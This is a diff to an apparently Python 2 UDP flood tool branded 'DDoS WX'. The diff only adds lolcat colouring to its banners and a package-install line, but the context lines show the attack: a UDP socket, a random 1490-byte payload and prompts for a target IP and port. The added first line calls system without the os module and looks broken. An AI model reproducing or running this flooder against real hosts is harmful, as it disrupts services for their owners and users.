@@ -1,3 +1,4 @@
+system('pkg install lolcat')
 import sys
 import os
 import time
@@ -16,7 +17,7 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
 os.system("clear")
-os.system("figlet DDos WX")
+os.system("figlet DDos WX | lolcat")
 print
 print "macker   : WX"
 print "telegram : https://t.me/Sad_Wx_virus"
@@ -26,8 +27,8 @@ ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
 os.system("clear")
-os.system("figlet ddos WX")
-os.system("figlet Attack WX")
+os.system("figlet DDos WX | lolcat")
+os.system("figlet Attack WX | lolcat")
 print "[--------------------] 0% "
 time.sleep(5)
 print "[>>>>>---------------] 25%"
